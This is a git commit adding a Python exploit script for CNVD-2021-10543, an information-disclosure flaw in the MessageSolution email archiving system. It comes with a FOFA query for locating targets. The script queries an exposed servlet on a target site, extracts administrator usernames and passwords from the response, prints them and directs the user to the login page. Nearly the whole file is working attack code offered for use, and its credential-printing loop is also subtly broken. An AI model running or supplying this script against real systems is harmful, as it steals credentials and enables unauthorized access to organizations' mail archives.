6f8f30874ee5ba7cae267ee24ab0461f91eca17f
Henry4E36 <41940481+Henry4E36@users.noreply.github.com>
2021-03-22 13:12:00 +0800

    Add files via upload

---
+++ CNVD-2021-10543.py
@@ -0,0 +1,53 @@
+# CNVD-2021-10543
+# MessageSolution 企业邮件归档管理系统 EEA 存在信息泄露漏洞
+# fofa: title="MessageSolution"
+
+import requests
+import time
+import json
+from bs4 import BeautifulSoup
+# 忽略SSL证书校验提醒
+requests.packages.urllib3.disable_warnings()
+
+def title():
+    print("+-------------------------------------------------+")
+    print("+-----------    CNVD-2021-10543   ----------------+")
+    print("+----------- MessageSolution信息泄漏 --------------+")
+    print('+--------- Fofa: title="MessageSolution" ---------+')
+    print("+--------  use: python3 CNVD-2021-10543.py -------+")
+    print("+-------------------------------------------------+")
+
+def target_url(url):
+    target_url = url + "/authenticationserverservlet/"
+    login_url = url + "/indexcommon.jsp"
+    # verify = False 忽略SSL证书校验
+    try:
+        res = requests.get(url=target_url, verify=False,timeout=5)
+        if "administrator" in res.text and res.status_code == 200:
+            print(f"[!] \033[31m目标系统: {url} 存在信息泄漏\033[0m")
+            time.sleep(1)
+            print("[!] \033[31m正在获取目标系统敏感信息.........\033[0m")
+            bs_xml = BeautifulSoup(res.text,features="html.parser")
+            user_names = bs_xml.findAll('username')
+            passwords = bs_xml.findAll('password')
+            i = 1
+            print(f"[!] \033[31m获取到目标系统信息:\033[0m")
+            if i < len(user_names):
+                for user_name,password  in user_names,passwords:
+                    print(f"   用户名: {user_name.text}    密 码: {password.text}")
+                    i = i+1
+            else:
+                print(f"   用户名: {user_names[0].text}\n   密 码: {passwords[0].text}")
+            print(f"\033[32m[0] 请访问: {login_url} 进行登录！")
+        else:
+            print(f"[0]  \033[32m目标系统: {url} 不存在信息泄\033[0m")
+    except Exception as e:
+        print(f"[!]  目标系统: {url} 出现意外错误：\n {e}")
+
+
+
+
+if __name__ == "__main__":
+    title()
+    url = str(input("[0] 请输入目标站点URL:\n"))
+    target_url(url)
